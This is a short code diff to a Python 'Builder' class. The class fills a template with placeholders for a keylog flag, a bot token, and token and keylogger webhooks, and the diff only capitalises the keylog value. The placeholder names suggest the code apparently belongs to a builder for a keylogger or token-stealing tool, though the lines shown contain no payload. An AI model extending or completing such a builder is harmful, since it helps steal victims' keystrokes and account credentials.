@@ -27,7 +27,7 @@ class Builder:
         file = f.read()
         f.close()
 
-        newfile = file.replace("{KEYLOG}", str(self.KEYLOG))
+        newfile = file.replace("{KEYLOG}", str(self.KEYLOG.capitalize()))
         newfile = newfile.replace("{BOT_TOKEN}", str(self.BOT_TOKEN))
         newfile = newfile.replace("{TOKEN_WEBHOOK}", str(self.TOKEN_WEBHOOK))
         newfile = newfile.replace("{KEYLOGGER_WEBHOOK}", str(self.KEYLOGGER_WEBHOOK))
